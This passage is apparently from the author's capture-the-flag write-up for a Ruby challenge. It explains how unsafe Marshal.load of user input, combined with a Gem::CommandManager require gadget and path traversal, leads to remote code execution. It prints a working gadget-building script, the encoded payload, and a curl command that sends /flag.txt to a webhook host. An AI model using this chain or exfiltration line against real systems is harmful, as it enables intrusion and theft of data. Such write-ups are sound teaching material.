        body << user_key
        body << "\r\n"
        
        body << "--#{boundary}--\r\n"
        
        request.body = body.join
        request.content_length = request.body.bytesize
        
        response = http.request(request)
        
        if response.is_a?(Net::HTTPSuccess)
          flash[:notice] = "File securely stored in legacy systems"
          redirect_to legacy_path
        else
          flash[:error] = "Failed to store file in legacy systems"
          redirect_to settings_path
        end
      rescue Errno::ENOENT
        flash[:error] = "File not found at specified path"
        redirect_to settings_path
      rescue StandardError => e
        flash[:error] = "Error sending file: #{e.message}"
        redirect_to settings_path
      end
    else
      render :index
    end
....
....
```

Alright so this endpoint communicates with an internal endpoint and it sends the file which is uploaded in the ``/settings`` endpoint and it also takes a ``user_string`` and a ``user_key``, and this endpoint will send these 3 values to the backend server, this will make sense once we audit the internal server's code. So lets take a 
look at the ``legacy`` service, there's only one file in this service which being ``legacy_storage.rb`` and this is its content.
```ruby
require 'webrick'
require 'fileutils'
require 'cgi'
require 'stringio'
require 'base64'
require 'rubygems/commands/exec_command'

PORT = 3001
UPLOAD_DIR = './internal_uploads'

FileUtils.mkdir_p(UPLOAD_DIR) unless Dir.exist?(UPLOAD_DIR)

flag = 'bi0sctf{Will_be_back_next_year_with_SFS_V2_:)}'
file_path = '/flag.txt'
begin
  File.open(file_path, 'w') do |file|
    file.write(flag)
  end
  puts "Flag written to #{file_path}"
rescue => e
  puts "An error occurred: #{e.message}"
end

class FileUploadServlet < WEBrick::HTTPServlet::AbstractServlet
  def do_POST(request, response)
    begin
      puts "Request headers: #{request.header.inspect}"
      puts "Request body: #{request.body.inspect}"
      
      content_type = request.header['content-type']&.first
      unless content_type && content_type.include?('multipart/form-data')
        response.status = 400
        response.body = "Bad Request: Expected multipart/form-data"
        return
      end

      boundary = content_type[/boundary=([^;]*)/, 1]&.strip
      unless boundary
        response.status = 400
        response.body = "Bad Request: Missing boundary"
        return
      end

      parts = parse_multipart(request.body, boundary)
      puts "Parsed parts: #{parts.inspect}"

      file_part = parts.find { |part| part[:name] == 'file' }
      string_part = parts.find { |part| part[:name] == 'string' }
      key_part = parts.find { |part| part[:name] == 'key' }

      unless file_part && file_part[:filename]
        response.status = 400
        response.body = "Bad Request: Missing file"
        return
      end

      filename = File.basename(file_part[:filename]).gsub(/[^a-zA-Z0-9._-]/, '_')
      file_path = File.join(UPLOAD_DIR, filename)
      
      File.binwrite(file_path, file_part[:data])

      if string_part&.dig(:data) && key_part&.dig(:data)
        begin
          decoded = Base64.decode64(string_part[:data])
          legacy_object = Marshal.load(decoded)
          key = key_part[:data]
          if legacy_object[key] == "no_store"
            FileUtils.rm(file_path) if File.exist?(file_path)
          end
        rescue ArgumentError, TypeError
        end
      end

      response.status = 200
      response.body = "File uploaded successfully"
    rescue StandardError => e
      response.status = 500
      response.body = "Server Error: #{e.message}"
      puts "Error: #{e.message}"
    end
  end

  private

  def parse_multipart(body, boundary)
    parts = []
    boundary = "--#{boundary}"

    body = body.gsub(/\r\n|\r|\n/, "\r\n")
    
    body.split(boundary).each do |part|
      next if part.strip.empty? || part.start_with?('--')
      
      headers, data = part.split("\r\n\r\n", 2)
      unless headers && data
        puts "Failed to split part: #{part.inspect}"
        next
      end
      
      puts "Part headers: #{headers.inspect}"
      puts "Part data: #{data.inspect}"
      
      headers = headers.sub(/\A\r\n/, '')
      
      disposition_line = headers.lines.find { |line| line.start_with?('Content-Disposition:') }
      if disposition_line
        name_match = disposition_line.match(/name="([^"]+)"/i)
        filename_match = disposition_line.match(/filename="([^"]+)"/i)
        name = name_match ? name_match[1] : nil
        filename = filename_match ? filename_match[1] : nil
      else
        puts "No Content-Disposition in headers: #{headers.inspect}"
        next
      end
      
      unless name
        puts "No name in Content-Disposition: #{headers.inspect}"
        next
      end
      
      data = data.chomp("\r\n") if data
      
      parts << {
        name: name,        
        filename: filename,
        data: data
      }
    end
    parts
  end
end

server = WEBrick::HTTPServer.new(Port: PORT)
server.mount('/', FileUploadServlet)

trap('INT') { server.shutdown }
puts "Legacy file upload service running on http://localhost:#{PORT}"
server.start
```

Alright, in this service we can see that the server uses ``WebRick`` as the server. It receives the ``file`` sent by the frontend server and stores it in a folder in this internal server. Also, there are no possibilities of path traversal or anything here.  

The backend server also takes the ``user_string`` coming from the frontend server, tries to decode the ``Base64`` string, and then deserializes the data using ``Marshal.load(decoded)``. This should fire some neurons in some of you, as this could be escalated to an RCE gadget.  

Now, the latest version of Ruby doesn’t have any universal deserialization gadget. This means that just by having control over what’s passed to ``Marshal.load``, one can’t achieve code execution. Rails has active gadgets that we could have used, but the internal server doesn’t use Rails (unlike the frontend server).  

So now it’s evident that we’ll need a gadget to exploit this. Also, now we know what to do with ``user_string``, but we still have to figure out the use case of the file that is sent to the backend server and the ``user_key`` that is used in the backend server like so.  

```ruby
          legacy_object = Marshal.load(decoded)
          key = key_part[:data]
          if legacy_object[key] == "no_store"
            FileUtils.rm(file_path) if File.exist?(file_path)
          end
```
Here, ``decoded`` corresponds to the Base64-decoded ``user_string`` from the frontend server, ``key`` corresponds to ``user_key`` from the frontend server, and ``file_path`` is the path where the file sent from the frontend server is uploaded.  

In short we have to connect the dots and figure out how we can utilize the uploaded file, ``user_string`` and ``user_key`` to get RCE.

![the_dots](https://raw.githubusercontent.com/winters0x64/gsm-128/refs/heads/main/download.jpg)

Alright, alright, let’s figure this out now... One extremely strange external module in this code is ``require 'rubygems/commands/exec_command'``. We’re requiring it but never using it in the server. This is kinda sus, so let’s look inside this module and see what we can find.  

```ruby
winters0x64@andromeda:~/bi0s/blog$ cat /usr/lib/ruby/vendor_ruby/rubygems/commands/exec_command.rb
# frozen_string_literal: true

require_relative "../command"
require_relative "../dependency_installer"
require_relative "../gem_runner"
require_relative "../package"
require_relative "../version_option"
...
...
```

Alright this has a lot of imports and ``exec_command.rb`` in itself doesn't have any viable gadget so lets take a look that the ``../gem_runner`` class that its importing.

So this is the contents of the ``gem_runner.rb`` file

```ruby
winters0x64@andromeda:~/bi0s/blog$ cat /usr/lib/ruby/vendor_ruby/rubygems/gem_runner.rb
# frozen_string_literal: true

#--
# Copyright 2006 by Chad Fowler, Rich Kilmer, Jim Weirich and others.
# All rights reserved.
# See LICENSE.txt for permissions.
#++

require_relative "../rubygems"
require_relative "command_manager"
require_relative "deprecate"
...
...
```

This also doesn't have any viable deserialization gadget so lets take a look into ``command_manager``, as its one of the classes that ``gem_runner`` imports.

So this is the contents of the file ``command_manager.rb``

```ruby
winters0x64@andromeda:~/bi0s/blog$ cat /usr/lib/ruby/vendor_ruby/rubygems/command_manager.rb

...
...
def initialize
  require "timeout"
  @commands = {}

  BUILTIN_COMMANDS.each do |name|
    register_command name
  end
end
...
...
```

This is good, since there is an ``initialize`` gadget here. That means we can deserialize using ``Marshal.load`` and get an object back with its ``@commands`` set to our own desired value. Hmmm, so we can control the ``@commands`` instance variable. But let’s see what we can do with it... scrolling down the code for ``command_manager`` you’ll stumble upon this piece of code.  

```ruby
# command_manager.rb
...
...
def [](command_name)
  command_name = command_name.intern
  return nil if @commands[command_name].nil?
  @commands[command_name] ||= load_and_instantiate(command_name)
end
...
...
```

Here, this ``[]`` function takes in a ``command_name`` argument and returns ``nil`` if it doesn’t exist in the ``@commands`` hash object. Remember that we can set the ``@commands`` array. Keep in mind that we can also control what’s passed as ``@command_name``. All we have to do is make ``Marshal.load`` deserialize a class instance of the ``Gem::CommandManager`` class. Then, we already know that we can pass a ``user_key`` to this internal server, and it will be utilized like this in the internal endpoint.  

```ruby
...
...
legacy_object = Marshal.load(decoded)
          key = key_part[:data]
          if legacy_object[key] == "no_store"
            FileUtils.rm(file_path) if File.exist?(file_path)
          end
...
...
```
That means we pass the serialized instance of ``Gem::CommandManager``, and ``Marshal.load`` will deserialize it and assign it to ``legacy_object``. Now, ``key`` is the user-given ``user_key`` from the ``legacy`` endpoint, and we can see that we do ``legacy_object[key]``, which means that we are actually calling the function named ``[]`` in ``Gem::CommandManager``. So, this means that we have control over the ``command_name`` variable, which is passed to the function ``[]`` — it is just our user-given ``user_key``.  

 Alright now it'll go ahead and call the function ``load_and_instantiate(command_name)`` lets see what this function does

```ruby
# command_manager.rb
...
...
def load_and_instantiate(command_name)
    command_name = command_name.to_s
    const_name = command_name.capitalize.gsub(/_(.)/) { $1.upcase } << "Command"
    load_error = nil

    begin
      begin
        require "rubygems/commands/#{command_name}_command"
      rescue LoadError => e
        load_error = e
      end
      Gem::Commands.const_get(const_name).new
    rescue Exception => e
      e = load_error if load_error

      alert_error clean_text("Loading command: #{command_name} (#{e.class})\n\t#{e}")
      ui.backtrace e
    end
  end
...
...
```

Alright, right off the bat we can see a lot of interesting stuff in this function, but let’s start from the beginning. We know that we can control ``command_name``. Now, here’s the most interesting line: ``require "rubygems/commands/#{command_name}_command"``.  

This means we can load some Ruby files into the Ruby ObjectSpace, but there’s a catch: even though we have control over the variable ``command_name``, the code automatically appends the string ``_command`` to the file that we want to require.  

Well, it seems like another dead end. But now I’ll show the exploit for the second part, and everything will make sense. We’ll finally connect all the dots :)  


### In a nutshell

- First, we’ll upload a file called ``load_command.rb`` to the ``/settings`` endpoint. Along with this, we proceed to leak the contents of the ``Legacy`` cookie using rotate chains. Make sure the ``load_command.rb`` file has your RCE payload, something like this:  

``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)` ``


- Then we'll send move on to the second part wherein we'll send the output of the following script as ``user_string``
(This is the exploit for the second part)
```ruby
require 'base64'

# Gadget to load our custom file via CommandManager
class Gem::CommandManager
  def initialize; end
end

obj_1 = Gem::CommandManager.new
obj_1.instance_variable_set(:@commands, {"../../../../../../../../../../app/internal_uploads/load": false })
a = Marshal.dump(obj_1)
payload = Base64.strict_encode64(a)
puts payload
```

And for the ``user_key`` we’ll send ``../../../../../../../../../../app/internal_uploads/load``.  

When these values reach the internal server, the ``load_command.rb`` file gets saved to the folder ``/app/internal_uploads``. Now, the serialized ``user_string`` after running the above exploit would be like this:  

``BAhvOhhHZW06OkNvbW1hbmRNYW5hZ2VyBjoOQGNvbW1hbmRzewY6PC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2FwcC9pbnRlcm5hbF91cGxvYWRzL2xvYWRG``  

The backend would deserialize this and assign it to the ``legacy_object`` variable, which now represents an instance of ``Gem::CommandManager`` with its ``@commands`` instance variable set to ``../../../../../../../../../../app/internal_uploads/load``.  

Following this, when the code executes ``legacy_object[key]``, we are actually executing ``legacy_object[../../../../../../../../../../app/internal_uploads/load]``. Internally, this calls the ``[](command_name)`` function. Inside that function, we can bypass this check:  

```ruby
return nil if @commands[command_name].nil?
```  

As ``@commands`` is defined by us, this hash object has the key named ``../../../../../../../../../../app/internal_uploads/load``. Following this, it’ll call the function ``load_and_instantiate``. Here we have the require gadget, but this time when it executes, it’ll be like this:  

``require "rubygems/commands/../../../../../../../../../../app/internal_uploads/load_command"``  

So when it appends the string ``_command`` to our ``key``, it becomes ``rubygems/commands/../../../../../../../../../../app/internal_uploads/load_command``. This now points to our uploaded file from the frontend server, which is stored on the backend server.  

This means that the internal server will include our file, and boom — RCE!!!!!! Ruby will evaluate the contents of the file that was just loaded into ObjectSpace by the ``require`` call. In this case, the executed code was:  

``puts `curl https://webhook.site/86339640-ac95-46ef-8afc-1a8fbaa9776b?msg=$(cat /flag.txt)``
  
This is our RCE payload, and hence we’ll get the flag in our webhook.  

![solved](https://raw.githubusercontent.com/winters0x64/gsm-128/refs/heads/main/a4cj0z.jpg)

## Closing thoughts

First huge shoutout to all the players who tried to solve this challenge, in my eyes this was not an easy challenge in any way, I feel like I could've made this challenge as two separate challenges as this challenge had 0 solves even after 36 hours of the competition.

I learned a ton while making this challenge, it was frustrating and took me months to research and make as you could tell by reading the writeup but it's a fun niche topic that I liked and explored further, which led me into researching class pollutions in ruby and uncovering a new method of exploiting class pollutions, **The Rotate Chains** method. 

Thanks everyone, hopefully ya'll learned something new. Be back with SFS_V2 next year, until then...

![goodbye](https://raw.githubusercontent.com/winters0x64/gsm-128/refs/heads/main/download%20(1).jpg)